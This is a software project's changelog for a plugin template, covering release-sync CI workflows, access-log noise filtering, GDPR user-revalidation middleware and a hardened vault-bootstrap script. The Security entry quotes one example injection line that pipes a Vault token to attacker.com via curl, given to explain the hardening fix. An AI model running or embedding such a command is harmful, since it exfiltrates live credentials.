# Changelog

All notable changes to this template plugin are documented in this file.
The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/)
and the project uses [calendar versioning](https://calver.org/) (`v2026.YY.x`).

## [Unreleased]

### Fixed

- `[sync]` `.github/workflows/update-release-draft.yml` —
  `sync_version_in_repo` now uses Staffbase Actions App token (via
  `actions/create-github-app-token`) instead of `GITHUB_TOKEN`.
  `GITHUB_TOKEN` cannot bypass main-branch repository rules
  ("Changes must be made through a pull request"), so the post-merge
  bot push failed with `GH013`. The Staffbase Actions App is on the
  bypass list.

### Added

- `[sync]` `.github/workflows/update-release-draft.yml` — two new jobs:
  - `sync_version_in_repo`: bumps `version` to the calver computed by
    `prepare_version` across:
    - **JSONs** (jq, conditional on `.version` existing): `plugin.json`,
      `package.json` (skipped when workspace root has no version, e.g.
      template + glossary), `client/package.json`, `server/package.json`,
      `widget/package.json`.
    - **README banner** (sed): `Version **X.Y.Z**.` literal line in
      `README.md` (present in downstream READMEs as a banner).
    Commits back to main via `github-actions[bot]` (`GITHUB_TOKEN`, no
    workflow re-trigger). Cron triggers skip.
  - `publish_release`: `gh release edit <new_tag> --draft=false --latest`
    on `push: main` to auto-flip the freshly refreshed Draft into Latest.
    Cron triggers skip.
  - Job order: `prepare_version` → `sync_version_in_repo` →
    `update_release_draft` → `publish_release`. Tag points at bumped HEAD,
    so the image build (cd.yml on `release: published`) checks out JSONs
    carrying the correct calver.
  - GitHub native release-notification (Watch subscriptions) becomes the
    canonical notification channel — no Slack webhook, no separate digest.

- `[template-only]` `.github/workflows/rollout-to-downstreams.yml` —
  net-new workflow closing the template-sync gap previously flagged in
  `docs/guides/template-sync.md` §"Auto-rollout". On manual dispatch
  (or `release: published` once enabled), discovers downstream repos via
  GitHub Code Search for repos carrying `.template-sync.yml`, filters
  archived/template/denylisted/disabled repos, computes a diff between
  the previous and current template release, applies `paths-to-skip`
  exclusions from each downstream's `.template-sync.yml`, applies via
  `git apply --3way`, and opens a DRAFT PR with body composed of
  `[sync]`-tagged CHANGELOG entries + any `notes` from the downstream's
  `.template-sync.yml`. `preview: true` dispatch input runs everything
  except the push + PR-create, surfacing a job-summary report so the
  workflow can be vetted before flipping on the `release: published`
  trigger. Token: needs an org-level `STAFFBASE_ROLLOUT_TOKEN` PAT with
  `contents: write` + `pull-requests: write` on downstream repos
  (denylist + per-downstream `enabled: false` are defence-in-depth).
  Why `[template-only]`: downstreams don't ship their own rollout
  workflow — this file lives only in the template.

- `[sync]` `widget/tests/widget.test.ts` — read `widgetVersion` from the
  widget's own `package.json` via `import widgetPkg from "../package.json"
  with { type: "json" }` instead of hardcoding `"1.0.0"` in the `mock.module`
  call. Removes the drift between the bumped `widget/package.json` and a
  stale hardcoded test value, so the test mock always reflects the actual
  shipped version.

### Fixed

- `server/src/middleware/access-log.ts` silence gate keyed on user
  context presence (`instanceId`), not `userId`. `gateAccessor()` in
  `sso.ts` deliberately scrubs `c.var.user.userId` to `""` on the
  `user_deleted` rejection path (defence-in-depth on top of the
  `x-auth-rejected` log carve-out) while keeping `instanceId`/`role`.
  The previous `!!ssoUser?.userId` check would have misclassified
  deleted-then-rejected accessors as anonymous and silenced their 4xx
  `/other` lines along with real scanner noise. New
  `hasUserContext(ssoUser)` helper covers the scrub case; regression
  test in `server/src/__tests__/access-log.test.ts` locks the contract.

### Added

- `server/src/middleware/access-log.ts` ships a scanner-noise carve-out:
  anonymous 4xx hits on the `/other` route bucket no longer emit an
  access-log line. Real-handler 4xx (validation rejects, 403, 404 on a
  matched route) and real-user 401s on `/api/*` keep logging. Metrics
  (`http_requests_total`, `http_request_duration_seconds`) are still
  recorded — only the log emission is skipped. Gated by new env
  `SILENCE_ANONYMOUS_4XX` (default `true`); set to `"false"` for raw
  access-log volume during incident triage. A 2026-05-23 cross-env
  audit found ~70% of prod log volume is scanner traffic
  (`/favicon.ico`, `/robots.txt`, `/api/sonicos/*`, `//pizza:pizza=pizza`
  encoding variants, anonymous `GET /`). The carve-out is shape-tested
  by a new `shouldSilenceAccessLog` pure helper with cases covering
  real-handler 4xx, populated-user 4xx, 2xx/3xx/5xx, and the flag-off
  branch. See [`docs/reference/log-catalog.md`](docs/reference/log-catalog.md)
  for the threat model + verification queries.
- Refactor: `accessLog` middleware extracted four small helpers
  (`captureRequestBodyIfLocalDev`, `addUserFields`,
  `addLocalDevBodyFields`, `emitTraceHeaders`) to keep cognitive
  complexity under the SonarLint 15 threshold.

- Strict-GDPR accessor revalidation layer:
  - Per-request `gateAccessor()` middleware confirms the authenticated user
    still exists upstream; rejects with 401 `user_deleted` and invalidates the
    session row on cookie/bearer-session paths.
  - In-process `ACCESSOR_VERIFIED_CACHE` (TtlCache) for the warm-path TTL gate;
    `getInstanceSettings()` is intentionally NOT memoised so the decrypted
    `apiToken` never persists in a module-level Map. Concurrent callers are
    collapsed onto a single in-flight settings SELECT.
  - Concurrency-capped fan-out for referenced-user revalidation.
  - 10-second `AbortSignal.timeout` on every upstream `/api/users/*` fetch;
    short-lived negative cache prevents 5xx/429 retry storms.
- `cleanupDeletedUser(instanceId, userId)` runs every write inside a single
  `db.transaction(...)` — partial DB failures no longer leave inconsistent
  multi-table state.

### Security

- `[sync] [scripts]` `scripts/vault-bootstrap.sh` no longer `source`s the env
  file; it parses `KEY=value` lines manually instead. `source` would execute
  arbitrary shell from the env file under a process already authenticated to
  Vault — a malicious or typo'd line like
  `DEV_SECRET="$(curl attacker.com/exfil?key=$VAULT_TOKEN)"` would have
  exfiltrated the live token. The new parser accepts standard `KEY=value`
  lines with optional single/double quotes, ignores comments and blanks, and
  never expands subshells. Back-ported from `cc-custom-plugin-applaunchpad`
  to bring the canonical template up to the hardened version that has been
  shipping in AL since [commit on `chore/applaunchpad-template-parity`].
  Downstream sync targets: `cc-custom-plugin-glossary` (still on the old
  `source` form — opens a `chore: sync vault-bootstrap from template` PR
  once the rollout workflow ships).

### Changed

- `app.ts` GDPR delete-intercept is a top-level `app.use("*", …)` middleware
  that runs before SSO/session issuance. It is narrowly skipped only when
  `IS_REAL_LOCALDEV=true` (which requires strict `NODE_ENV === "development"`
  — an allowlist, no fallback) AND the request is `POST` with `?jwt=dev`. Any
  other `?jwt=` value still goes through real JWT validation, and a
  misconfigured `IS_LOCALDEV=true` in CI/staging cannot disable the gate.
- ADRs 0011 (user cache lifecycle), 0012 (strict-GDPR lifecycle), 0013
  (logging contract) document the layer.
- New consolidated docs page [docs/architecture/gdpr-hardening.md](docs/architecture/gdpr-hardening.md)
  is the single canonical narrative for the three-layer model: per-request
  accessor gate, per-render reference fan-out, background sweep, plus
  the transactional purge. Includes mermaid sequence diagrams for the
  gate + fan-out flows, a flowchart for the cleanup transaction, a
  threat-scenario / time-to-catch table, a configuration knob reference,
  and a code-layout map. Reads top-down for new engineers and
  cross-references every ADR / source file rather than duplicating
  content. Downstream plugins (applaunchpad, glossary, audio-hub)
  inherit on next template sync; they should link to this page rather
  than re-document.
- New [docs/reference/log-catalog.md](docs/reference/log-catalog.md) —
  production line-by-line reference. Explains the three lines that
  recur in observatory-de1 (the `GET / → 401 (1ms)` access-log entry
  from anonymous probes, the `warn Accessor revalidation: user deleted
  upstream.` event when Layer 1 confirms a delete, and the `warn API
  response error.` companion from the Staffbase API client). Covers
  log schema, severity → action playbook, common Grafana / Victoria
  Logs queries, and a "the plugin returned 401 — what's going on"
  diagnostic flowchart.
- `[template-only]` New guide [docs/guides/template-sync.md](docs/guides/template-sync.md)
  describes the canonical-template workflow: how to land generic improvements
  in this repo, then roll them out to each downstream plugin via a DRAFT PR
  + the `dev` label that drives the autodev → dev cluster preview before
  merging. Covers code, documentation, *and* generic helper scripts
  (vault-bootstrap, capture-docs-*, check-dependabot-blockers, dev runner) —
  docs-only sync PRs skip the `dev` label / Flux preview and instead rely on
  render + link checks plus the TechDocs publish workflow, with
  `[sync] [docs]` / `[sync] [scripts]` CHANGELOG sub-tags so downstream
  maintainers can spot the port type at a glance. Final section sketches the
  future automated rollout workflow once the template has a remote and cuts
  versioned releases — including a file-driven eligibility model
  (`.template-sync.yml` at the repo root is the allowlist; presence + `enabled:
  true` is required to participate) layered with archived/template filters
  and a hard-coded denylist backstop for legacy repos like
  `cc-custom-plugin-example` / `cc-custom-plugin-code-generator`. No GitHub
  topic tagging needed — file lives next to the code it governs and is
  reviewable in a PR.

### Notes for plugins forked from this template

Local-only canonical baseline. No release tag is cut here — downstream forks
(applaunchpad, glossary) consume these changes via their own release lines.

## Notes for plugins forked from this template

Replace this file in your forked repo with a fresh `## [Unreleased]` block
and start tracking changes there. Reference the source template version
in your first release note for traceability.
